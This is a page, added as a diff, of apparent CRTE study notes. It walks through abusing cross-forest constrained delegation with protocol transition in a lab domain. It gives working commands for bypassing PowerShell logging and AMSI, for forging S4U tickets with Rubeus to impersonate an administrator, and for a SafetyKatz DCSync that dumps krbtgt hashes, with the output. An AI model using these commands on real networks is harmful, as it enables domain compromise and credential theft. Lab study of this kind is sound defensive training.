@@ -1,0 +1,230 @@
+---
+title: Cross Forest Attacks - Constrained Delegation with Protocol Transition
+layout: docs
+---
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cross Forest Attacks - Constrained Delegation with Protocol Transition - CRTE</title>
+  <link rel="shortcut icon" href="../../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .portfolio-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .portfolio-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="portfolio-link">← Portfolio</a>
+          <h3>Sections</h3>
+          <a href="overview.html" class="">Overview</a>
+
+          <a href="part-01-introduction.html" class="">Introduction</a>
+          <a href="part-02-enumeration.html" class="">Enumeration</a>
+          <a href="part-03-enumerating-gpos-ous.html" class="">Enumerating GPOs and OUs</a>
+          <a href="part-04-enumerating-acl.html" class="">Enumerating ACL (Access Control List)</a>
+          <a href="part-05-enumerating-domain-forest-trusts.html" class="">Enumerating Domain, Forest & Trusts </a>
+          <a href="part-06-privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="part-07-kerberoasting-attack.html" class="">Kerberoasting attack</a>
+          <a href="part-08-targeted-kerberoasting.html" class="">Privilege Escalation - Targeted Kerberoasting</a>
+          <a href="part-09-laps-attack.html" class="">Privilege Escalation - LAPS (Local Administrator Password Solution) Attack</a>
+          <a href="part-10-dumping-lsass-credentials.html" class="">Dumping LSASS Credentials</a>
+          <a href="part-11-gmsa-attack.html" class="">Privilege Escalation - gMSA Attack</a>
+          <a href="part-12-lsass-mde-bypass.html" class="">LSASS Attack With MDE Bypass</a>
+          <a href="part-13-pass-the-certificates.html" class="">Pass The Certificates Attack</a>
+          <a href="part-14-unconstrained-delegation.html" class="">Privilege Escalation - Unconstrained Delegation</a>
+          <a href="part-15-constrained-delegation.html" class="">Privilege Escalation - Constrained Delegation</a>
+          <a href="part-16-rbcd.html" class="">Privilege Escalation - RBCD(Resource Based Constrained Delegation)</a>
+          <a href="part-17-golden-ticket.html" class="">Domain Persistence - Golden Ticket attack</a>
+          <a href="part-18-silver-ticket.html" class="">Domain Persistence - Silver Ticket Attack</a>
+          <a href="part-19-diamond-ticket.html" class="">Domain Persistence - Diamond Ticket Attack</a>
+          <a href="part-20-skeleton-key.html" class="">Domain Persistence - Skeleton Key Attack</a>
+          <a href="part-21-sapphire-ticket.html" class="">Domain Persistence - Sapphire Ticket Attack</a>
+          <a href="part-22-adminsdholder.html" class="">Domain Persistence - AdminSDHolder attack</a>
+          <a href="part-23-adcs-attacks.html" class="">Cross Domain Attacks - Active Directory Certificate Services Attacks</a>
+          <a href="part-24-shadow-credentials.html" class="">Shadow Credentials - Abusing User Object</a>
+          <a href="part-25-cross-domain-unconstrained.html" class="">Cross Domain Attacks - Unconstrained Delegation to Enterprise Admin</a>
+          <a href="part-26-azure-ad-phs.html" class="">Cross Domain Attacks - Attacking Azure AD Integration PHS</a>
+          <a href="part-27-child-to-forest-trust-key.html" class="">Cross Domain attacks - Child To Forest Root - SID-History Trust Key Abuse</a>
+          <a href="part-28-child-to-forest-sidhistory-krbtgt.html" class="">Cross Domain attacks - Child To Forest Root - SID-History KRBTGT Hash Abuse</a>
+          <a href="part-29-cross-forest-kerberoast.html" class="">Cross Forest Attacks - Kerberoast Attack</a>
+          <a href="part-30-protocol-transition.html" class="active">Cross Forest Attacks - Constrained Delegation with Protocol Transition</a>
+          <a href="part-31-cross-forest-unconstrained.html" class="">Cross Forest Attacks - Unconstrained Delegation</a>
+          <a href="part-32-trust-key-shared-resources.html" class="">Cross Forest Attacks - Trust Key Abuse to Access Explicitly Shared Resources</a>
+          <a href="part-33-injecting-sidhistory.html" class="">Cross Forest Attacks - Injecting SID History to Bypass SID Filtering</a>
+          <a href="part-34-mssql-database-links.html" class="">Trust Abuse - MSSQL Servers - Database Links</a>
+          <a href="part-35-foreign-security-principals.html" class="">Cross Forest Attacks - Foreign Security Principals & ACLs</a>
+          <a href="part-36-pam-shadow-security-principals.html" class="">Cross Forest Attacks - Abusing PAM(Privileged Management Principals) Trust - Shadow Security Principals</a>
+          <a href="part-37-trusting-to-trusted.html" class="">Cross Forest Attacks - Trusting to Trusted - Trust Key</a>
+          <a href="part-38-abusing-trust-transitivity.html" class="">Cross Forest Attacks - Abusing Trust Transitivity</a>
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="arrow-back-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Back</p>
+              <a href="../../../" class="contact-link">Portfolio</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">Cross Forest Attacks - Constrained Delegation with Protocol Transition</header>
+        <section class="about-text notion-content">
+<p id="30c79e9a-d7c9-800c-9fdc-ca2e026a26b9" class="">When working with multi-forest Active Directory environments, constrained delegation with protocol transition does not function across forests by default. This is because Kerberos tickets issued in one forest are not inherently trusted by another forest unless a trust relationship is explicitly established. However, once a trust is in place, there are multiple ways we can abuse constrained delegation to escalate privileges and pivot laterally into a different forest.</p><p id="30c79e9a-d7c9-80cd-ab68-c9d88f5f10e0" class="">Many organizations fail to properly monitor delegation settings, and security controls are often limited to the domain level rather than extending to cross-forest interactions. This creates an opportunity for us to exploit poorly secured delegation configurations in one forest and use them to compromise high-value assets in another.</p><h2 id="30c79e9a-d7c9-8054-b3b2-e53633c46f9b" class=""><strong>Understanding Forest Trusts and Their Role in Delegation Abuse</strong></h2><p id="30c79e9a-d7c9-8008-941a-e4de350652e3" class="">In an Active Directory environment with multiple forests, trust relationships can be established to allow authentication between them. These trusts can be either:</p><ul><li><strong>External Trusts:</strong> A one-way or two-way non-transitive trust between two domains in different forests.</li></ul><ul><li><strong>Forest Trusts:</strong> A one-way or two-way transitive trust that allows all domains in the trusting forest to access resources in the trusted forest.</li></ul><p id="30c79e9a-d7c9-8045-8d78-f54a38a61040" class="">For delegation to work across forests, there are two key conditions:</p><ol><li>The trust must be <strong>established with &quot;Selective Authentication&quot; disabled</strong> or explicitly configured to allow authentication.</li></ol><ol><li>The <strong>Trusted-to</strong> forest must have an SPN that the delegating account in the <strong>Trusted-From</strong> forest can target.</li></ol><p id="30c79e9a-d7c9-8037-87c8-f3521f9cc857" class="">This means that if we compromise an account with constrained delegation enabled in a trusted forest, we might be able to request service tickets for resources in the trusted domain, provided that the domain controllers allow it. The key to abusing this misconfiguration lies in manipulating Kerberos delegation and protocol transition.</p><h2 id="30c79e9a-d7c9-801d-be24-f11985ee4324" class=""><strong>How Constrained Delegation with Protocol Transition is Abused in Cross-Forest Scenarios</strong></h2><p id="30c79e9a-d7c9-8084-a413-e75a67af6aee" class="">The standard constrained delegation attack relies on <strong>S4U2Self</strong> and <strong>S4U2Proxy</strong> requests. If we control a service account that has constrained delegation enabled, we can force it to obtain Kerberos tickets for other services on behalf of any user.</p><p id="30c79e9a-d7c9-8017-b5e5-f3651cf595a2" class="">Now, when dealing with a multi-forest environment, the challenge is that a service ticket issued in one forest is not automatically trusted in another. However, <strong>when a forest trust exists</strong>, we can manipulate constrained delegation to request tickets for services in the trusted forest.</p><h3 id="30c79e9a-d7c9-8073-b489-f90cd835b1b9" class=""><strong>Attack Workflow: Exploiting Cross-Forest Constrained Delegation</strong></h3><p id="30c79e9a-d7c9-80dc-b8d5-ca026fef8e1e" class="">If we gain control over a service account in the <strong>trusted</strong> forest, we can attempt to request Kerberos tickets for <strong>services in the trusting forest</strong> by leveraging constrained delegation. The steps typically involve:</p><ol><li><strong>Compromising a Service Account in the Trusted Forest</strong><ul><li>We identify an account with constrained delegation enabled.</li></ul><ul><li>Using tools like <strong>BloodHound</strong>, we check the <code>msDS-AllowedToDelegateTo</code> attribute to see which services the account is allowed to delegate to.</li></ul><ul><li>If the account has access to critical services like CIFS, LDAP, or HTTP on a domain controller, we can proceed with our attack.</li></ul></li></ol><ol><li><strong>Performing S4U2Self to Obtain a User Ticket</strong><ul><li>Using <strong>Rubeus</strong>, we request a <strong>Kerberos ticket</strong> for a target user on the compromised service account.</li></ul><ul><li>If protocol transition is enabled, we can request a ticket on behalf of <strong>any</strong> user without knowing their password or having their NTLM hash.</li></ul></li></ol><ol><li><strong>Performing S4U2Proxy to Obtain a Cross-Forest Ticket</strong><ul><li>Once we have an S4U2Self ticket, we attempt to request a <strong>service ticket</strong> for a target system in the <strong>trusting forest</strong>.</li></ul><ul><li>If successful, we now have a Kerberos ticket that allows us to access services on the domain controller in the <strong>trusting forest</strong>.</li></ul></li></ol><ol><li><strong>Performing DCSync Attack for Full Forest Compromise</strong><ul><li>If we obtained a ticket for <strong>LDAP or CIFS</strong> on a domain controller in the trusting forest, we can now attempt a <strong>DCSync attack</strong>.</li></ul><ul><li>Using <strong>Mimikatz</strong>, we extract all password hashes from the domain controller.</li></ul><ul><li>At this point, we have full control over the <strong>trusting forest</strong> and can pivot further.</li></ul></li></ol><h2 id="30c79e9a-d7c9-80cf-a652-e955375774dd" class=""><strong>Why This Attack Works and Common Misconfigurations That Enable It</strong></h2><p id="30c79e9a-d7c9-8038-a1e6-ed0e3ce2d13c" class="">The ability to abuse constrained delegation with protocol transition in a cross-forest scenario relies on several common misconfigurations:</p><ol><li><strong>Selective Authentication is Not Enforced</strong><ul><li>If &quot;Selective Authentication&quot; is disabled in the forest trust, accounts in the trusted forest can authenticate to any resource in the trusting forest.</li></ul></li></ol><ol><li><strong>Service Account Delegation is Not Properly Restricted</strong><ul><li>The <code>msDS-AllowedToDelegateTo</code> attribute allows delegation to critical services, such as CIFS, LDAP, or HTTP on domain controllers.</li></ul></li></ol><ol><li><strong>No Monitoring for Kerberos Service Tickets</strong><ul><li>Organizations rarely monitor S4U2Self and S4U2Proxy requests, making it easy for attackers to generate forged tickets without detection.</li></ul></li></ol><ol><li><strong>Overprivileged Service Accounts</strong><ul><li>If a service account has been granted unnecessary delegation rights, it becomes an easy target for attackers.</li></ul></li></ol><h2 id="30c79e9a-d7c9-803d-aa2e-f629efe5b5b5" class=""><strong>How We Can Maintain Persistence in a Cross-Forest Scenario</strong></h2><p id="30c79e9a-d7c9-8040-8797-e2e77eac9bff" class="">Once we gain access to a domain controller in the trusting forest, we need to ensure persistent access. There are several techniques we can use:</p><ol><li><strong>Create a New Delegated Account</strong><ul><li>If we have domain admin access, we can create a new account and configure it with constrained delegation.</li></ul><ul><li>This allows us to re-establish access at any time.</li></ul></li></ol><ol><li><strong>Golden Ticket Attack</strong><ul><li>If we extract the <strong>KRBTGT</strong> hash from the trusting forest, we can forge Kerberos tickets indefinitely.</li></ul></li></ol><ol><li><strong>Modify the msDS-AllowedToDelegateTo Attribute</strong><ul><li>We can modify the <code>msDS-AllowedToDelegateTo</code> attribute to include additional high-value services.</li></ul></li></ol><p id="30c79e9a-d7c9-8077-ba1b-e8edb3d8230b" class="">Cross-forest constrained delegation attacks are a powerful way to move laterally in multi-forest environments. Since many organizations fail to properly secure delegation settings, we can often exploit these misconfigurations to escalate privileges across forest boundaries. By leveraging S4U2Self and S4U2Proxy requests, we can impersonate privileged users and request service tickets for high-value targets, such as domain controllers.</p><p id="30c79e9a-d7c9-808a-ae8e-dc563c6bb2b5" class="">This attack becomes even more dangerous when combined with techniques like <strong>DCSync</strong>, <strong>Golden Ticket forging</strong>, and <strong>modifying delegation attributes</strong>. Once we establish a foothold in a trusted forest, we can expand our control to other forests, often without detection.</p><p id="30c79e9a-d7c9-80d8-9faa-cbc795ef7a9e" class="">The key to success in these attacks lies in identifying weak delegation configurations, abusing Kerberos ticket manipulation, and ensuring persistence through misconfigured accounts. As red teamers, understanding how to exploit these weaknesses allows us to efficiently escalate privileges and demonstrate the risks of improper delegation settings in real-world environments.</p><h1 id="30c79e9a-d7c9-80dd-b0db-f9ba40efe12a" class="">Enumerating Constrained Delegation with ADModule</h1><p id="30c79e9a-d7c9-807d-bba3-fbd9aeb51bca" class="">Let’s start our Constrained Delegation with ADModule by executing InvisiShell to bypass PowerShell security features like system-wide transcription, Script Block Logging, AMSI and Constrained Language Mode(CLM).</p><p id="30c79e9a-d7c9-80c9-a56c-e3b642b638e2" class=""><code>RunWithRegistryNonAdmin.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20145.png" alt="Image"/><p id="30c79e9a-d7c9-8084-929e-cc03c81c3e12" class="">After bypassing Powershell Security Features we can now import ADModule.</p><p id="30c79e9a-d7c9-808d-a810-d146756b5d71" class=""><code>Import-Module Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</code></p><p id="30c79e9a-d7c9-80b9-9e57-d4473ca02497" class=""><code>Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20127.png" alt="Image"/><p id="30c79e9a-d7c9-8068-b59d-c0ec78854c49" class="">Now that we have imported our <strong>ADModule</strong>, we can use <code><strong>GetADObject</strong></code> to Enumerate Constrained Delegation in our target domain.</p><p id="30c79e9a-d7c9-802a-9c82-f60f3bd9b234" class=""><code>Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne &quot;$null&quot;} -Properties msDS-AllowedToDelegateTo -Server eu.local</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20295.png" alt="Image"/><p id="30c79e9a-d7c9-807a-bb4c-ddb8ea34534f" class="">As we can see above after our Constrained Delegation enumeration, it’s possible to see that user <code><strong>storagesvc</strong></code> service account contains flag <code><strong>msDS-AllowedToDelegateTo</strong></code> for Service <code><strong>Time</strong></code> on EU-DC.eu.local</p><h1 id="30c79e9a-d7c9-801d-81f7-ed5b40cd500d" class="">Enumerating Constrained Delegation with PowerView</h1><p id="30c79e9a-d7c9-805d-9ae5-dede32626624" class="">Let’s start our Constrained Delegation with ADModule by executing InvisiShell to bypass PowerShell security features like system-wide transcription, Script Block Logging, AMSI and Constrained Language Mode(CLM).</p><p id="30c79e9a-d7c9-808d-8f77-f1b340f1baa0" class=""><code>RunWithRegistryNonAdmin.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20145.png" alt="Image"/><p id="30c79e9a-d7c9-80b5-ba22-fa72d7351672" class="">After bypassing Powershell Security Features we can now import PowerView.</p><p id="30c79e9a-d7c9-8065-ac19-dc79f68eb960" class=""><code>Import-Module .\PowerView.ps1</code></p><p id="30c79e9a-d7c9-80ad-b5e7-cc679a96b94b" class=""><code>Get-DomainUser -TrustedToAuth -Domain eu.local</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20296.png" alt="Image"/><p id="30c79e9a-d7c9-8088-afca-ed6857daeb37" class="">As we can see above after our Constrained Delegation enumeration, it’s possible to see that user <code><strong>storagesvc</strong></code> service account contains flag <code><strong>msDS-AllowedToDelegateTo</strong></code> for Service <code><strong>Time</strong></code> on EU-DC.eu.local</p><p id="30c79e9a-d7c9-8024-b621-c2d930b10c4f" class=""><code>Get-DomainComputer -TrustedToAuth -Domain eu.local</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20297.png" alt="Image"/><p id="30c79e9a-d7c9-80e7-8e2e-e844d66b233c" class="">We did not find any computer account with Constrained Delegation enabled.</p><p id="30c79e9a-d7c9-8064-b607-c7b6fcff0289" class="">Assuming that we were able to compromise this <code><strong>storagesvc</strong></code> service account already and we do have credentials for this service account. We can use either clear-text password or its hash. For Opsec purpose, We will be using the NTLM hash. We can Rubeus for key all it’s hashes. </p><p id="30c79e9a-d7c9-8009-9642-c73f6eaa7a6e" class="">We must should remember that we will be using Loader.exe to run Rubeus in the memory, so we need to encode our argument (<code><strong>hash</strong></code>) before we pass it when using Rubeus.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20298.png" alt="Image"/><p id="30c79e9a-d7c9-8020-8464-ca3be696f2ba" class="">Let’s now run Rubeus in memory using our .Net loader.</p><p id="30c79e9a-d7c9-800c-b8ca-db5a6714d8e0" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /password:Qwerty@123 /domain:eu.local</code></p><pre id="30c79e9a-d7c9-8047-ab73-d1e6d7a83564" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Qwerty@123
+[*] Input username             : storagesvc
+[*] Input domain               : eu.local
+[*] Salt                       : EU.LOCALstoragesvc
+[*]       rc4_hmac             : 5C76877A9C454CDED58807C20C20AEAC
+[*]       aes128_cts_hmac_sha1 : 4A5DDDB19CD631AEE9971FB40A8195B8
+[*]       aes256_cts_hmac_sha1 : 4A0D89D845868AE3DCAB270FE23BEDD442A62C4CAD7034E4C60BEDA3C0F65E04
+[*]       des_cbc_md5          : 7F7C6ED00258DC57</code></pre><p id="30c79e9a-d7c9-808b-9aa4-e0990f1bba02" class="">Now that we do have the storagesvc NTLM hash, we will use <strong>Rubeus</strong> to perform an <code>S4U</code><strong> attack</strong> (Service-for-User) by requesting any alternative service like <code><strong>LDAP</strong></code> for example impersonating the <code><strong>eu.local</strong></code> administrator.</p><p id="30c79e9a-d7c9-8019-8355-fda3cbe1b86a" class=""><code>ArgSplit.bat</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20299.png" alt="Image"/><p id="30c79e9a-d7c9-80ea-bc68-cd903ef4a517" class="">Let’s now run Rubeus in memory using our .Net loader.</p><p id="30c79e9a-d7c9-80d3-a845-c8b322229464" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC /impersonateuser:administrator /domain:eu.local /msdsspn:nmagent/eu-dc.eu.local /altservice:LDAP /dc:eu-dc.eu.local /ptt</code></p><p id="30c79e9a-d7c9-8075-b3e8-c2553e1969aa" class="">We can double check if we were able to inject the into into our session using <code><strong>klist</strong></code> command.</p><p id="30c79e9a-d7c9-80d0-8d40-f91b55832d9c" class=""><code>klist</code></p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20300.png" alt="Image"/><p id="30c79e9a-d7c9-8066-bb32-cf2b3bd90331" class="">Now we can use our SafetyKatz for the DCSync attack, but just before that, we should remember that we will be using Loader.exe to run SafetyKatz in the memory, so we need to encode our argument (<code><strong>lsadump::dcsync</strong></code>) before we pass it when using SafetyKatz.</p><img src="../../../assets/crte/CRTE%20-%20Certified%20Red%20Team%20Expert/image%20301.png" alt="Image"/><p id="30c79e9a-d7c9-8086-b1d9-c6bb79f29c47" class="">Let’s now run SafetyKatz  in memory using our .Net loader.</p><p id="30c79e9a-d7c9-8062-ad31-ef3321e7f6d7" class=""><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args &quot;%Pwn% /user:eu\krbtgt /domain:eu.local&quot; &quot;exit&quot;</code></p><pre id="30c79e9a-d7c9-80a5-9f15-dcfbe4efa005" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/12/2019 10:00:04 PM
+Object Security ID   : S-1-5-21-3657428294-2017276338-1274645009-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 83ac1bab3e98ce6ed70c9d5841341538
+    ntlm- 0: 83ac1bab3e98ce6ed70c9d5841341538
+    lm  - 0: bcb73c3d2b4005e405ff7399f3ca2bf0
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : a0c1c86edafc0218a106426f2309bafd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : EU.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : b3b88f9288b08707eab6d561fefe286c178359bda4d9ed9ea5cb2bd28540075d
+      aes128_hmac       (4096) : e2ef89cdbd94d396f63c9aa5b66e16c7
+      des_cbc_md5       (4096) : 92371fe32c9ba208
+
+* Primary:Kerberos *
+    Default Salt : EU.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 92371fe32c9ba208
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  bbd1d8cc9e5001a195c0aea8260dc460
+    02  a8a12e010ecbfa9772ffbf94a0c53bbf
+    03  5c4ea92171032c3655c6dab468555c1b
+    04  bbd1d8cc9e5001a195c0aea8260dc460
+    05  a8a12e010ecbfa9772ffbf94a0c53bbf
+    06  b0ebda7d1fa949eef7f3618fb745e92d
+    07  bbd1d8cc9e5001a195c0aea8260dc460
+    08  4f1dd1dc8c185043ea5f588bced2e536
+    09  4f1dd1dc8c185043ea5f588bced2e536
+    10  388e53f1b4fc51f5f2a046e9a03d15f8
+    11  7a7451acdbda7ca3ea2b9c29a5505805
+    12  4f1dd1dc8c185043ea5f588bced2e536
+    13  40fb8f21d6689dc78cfa977b8678fba0
+    14  7a7451acdbda7ca3ea2b9c29a5505805
+    15  8c35ff6c675fea1d7fa64405721aba20
+    16  8c35ff6c675fea1d7fa64405721aba20
+    17  63fb31e1ff838c848d1e0cbaed8c272e
+    18  4e60cf1107bbc98e8fbb76499de1dd96
+    19  035a4fe85f9cbe04af399507cd09d7eb
+    20  6c0a58bf772f0ce23496ac5dc68672f7
+    21  726b4122553e3a61b34c5e08ab04006e
+    22  726b4122553e3a61b34c5e08ab04006e
+    23  b65f6706fbb5f5e370b76c892cbf98dd
+    24  2e16efd1ddfe850f2b8f47ccdd5501ff
+    25  2e16efd1ddfe850f2b8f47ccdd5501ff
+    26  2afde765ea5c02b1a282f63d9a88ab45
+    27  756254f63a68f4f0cf34e82d11986474
+    28  50ab58d5ae45dc5792e1dc9d5f6945a5
+    29  1b252cf7a18c4e6fcceb388e0e2a0ef6
+
+
+mimikatz(commandline) # exit</code></pre><p id="30c79e9a-d7c9-801c-b9b6-e5efd68f67f6" class="">Here’s a table of services that can be forged for <strong>Kerberos tickets</strong> along with the <strong>native tools or protocols</strong> that rely on these services. This information is critical for targeting specific resources during post-exploitation:</p><table id="30c79e9a-d7c9-803a-ba54-ef12e79c761a" class="simple-table"><tbody><tr id="30c79e9a-d7c9-80b1-85b7-f8754a13c6a4"><td id="LgfO" class="" style="width:275px"><strong>Service (SPN)</strong></td><td id="swSD" class="" style="width:467px"><strong>Purpose/Protocol</strong></td><td id="Al]|" class="" style="width:451px"><strong>Native Tool/Access Method</strong></td></tr><tr id="30c79e9a-d7c9-806c-a44a-d4c507eb776d"><td id="LgfO" class="" style="width:275px"><strong>HTTP</strong></td><td id="swSD" class="" style="width:467px">Web-based access, including WinRM/WinRS</td><td id="Al]|" class="" style="width:451px"><code>winrs</code>, PowerShell Remoting (WinRM)</td></tr><tr id="30c79e9a-d7c9-80ab-ada9-c999e9ccf279"><td id="LgfO" class="" style="width:275px"><strong>HOST</strong></td><td id="swSD" class="" style="width:467px">General host-based services</td><td id="Al]|" class="" style="width:451px">WMI, SMB, Remote Service Management</td></tr><tr id="30c79e9a-d7c9-8003-a870-f8664c82e86a"><td id="LgfO" class="" style="width:275px"><strong>CIFS</strong></td><td id="swSD" class="" style="width:467px">File sharing over SMB</td><td id="Al]|" class="" style="width:451px"><code>net use</code>, <code>dir \\share\folder</code>, File Explorer</td></tr><tr id="30c79e9a-d7c9-8017-afc5-e07123004629"><td id="LgfO" class="" style="width:275px"><strong>RPCSS</strong></td><td id="swSD" class="" style="width:467px">Remote Procedure Call services</td><td id="Al]|" class="" style="width:451px">WMI, DCOM, RPC-based tools</td></tr><tr id="30c79e9a-d7c9-806a-848c-d298c58bb415"><td id="LgfO" class="" style="width:275px"><strong>MSSQLSvc</strong></td><td id="swSD" class="" style="width:467px">Microsoft SQL Server</td><td id="Al]|" class="" style="width:451px">SQL Management Studio, ODBC, SQLCMD</td></tr><tr id="30c79e9a-d7c9-808e-aab3-dc89cd976c44"><td id="LgfO" class="" style="width:275px"><strong>LDAP</strong></td><td id="swSD" class="" style="width:467px">Directory access over LDAP</td><td id="Al]|" class="" style="width:451px"><code>ldapsearch</code>, <code>dsquery</code>, AD enumeration tools</td></tr><tr id="30c79e9a-d7c9-802b-af71-c0a1195fd316"><td id="LgfO" class="" style="width:275px"><strong>SMTPSVC</strong></td><td id="swSD" class="" style="width:467px">SMTP service for mail servers</td><td id="Al]|" class="" style="width:451px">Sending emails via Exchange or SMTP relay</td></tr><tr id="30c79e9a-d7c9-80bb-96f0-f32f1770a5e5"><td id="LgfO" class="" style="width:275px"><strong>IMAP</strong></td><td id="swSD" class="" style="width:467px">Email access over IMAP</td><td id="Al]|" class="" style="width:451px">Email clients (e.g., Thunderbird, Outlook)</td></tr><tr id="30c79e9a-d7c9-8029-aa2c-d7a3d6fee9c2"><td id="LgfO" class="" style="width:275px"><strong>POP3</strong></td><td id="swSD" class="" style="width:467px">Email access over POP3</td><td id="Al]|" class="" style="width:451px">Email clients</td></tr><tr id="30c79e9a-d7c9-80dd-9495-ced343a32897"><td id="LgfO" class="" style="width:275px"><strong>FTP</strong></td><td id="swSD" class="" style="width:467px">File transfer over FTP</td><td id="Al]|" class="" style="width:451px"><code>ftp</code> client, FileZilla, command-line FTP</td></tr><tr id="30c79e9a-d7c9-80f6-827e-fdce64797b82"><td id="LgfO" class="" style="width:275px"><strong>RDP</strong></td><td id="swSD" class="" style="width:467px">Remote Desktop Protocol</td><td id="Al]|" class="" style="width:451px">MSTSC (Remote Desktop Connection)</td></tr><tr id="30c79e9a-d7c9-8033-89be-e50e3c2314b2"><td id="LgfO" class="" style="width:275px"><strong>WSMAN</strong></td><td id="swSD" class="" style="width:467px">Windows Remote Management (WinRM)</td><td id="Al]|" class="" style="width:451px">PowerShell Remoting, <code>Invoke-Command</code></td></tr><tr id="30c79e9a-d7c9-809c-bad9-e1859c42749e"><td id="LgfO" class="" style="width:275px"><strong>TERMSRV</strong></td><td id="swSD" class="" style="width:467px">Terminal Services</td><td id="Al]|" class="" style="width:451px">RDP sessions, RemoteApp</td></tr><tr id="30c79e9a-d7c9-809b-b47d-cb45cee854dd"><td id="LgfO" class="" style="width:275px"><strong>DNS</strong></td><td id="swSD" class="" style="width:467px">Domain Name System</td><td id="Al]|" class="" style="width:451px">DNS queries, <code>nslookup</code>, DNS-based enumeration</td></tr><tr id="30c79e9a-d7c9-8095-8113-f357c05d1afe"><td id="LgfO" class="" style="width:275px"><strong>SHELL</strong></td><td id="swSD" class="" style="width:467px">Remote Shell 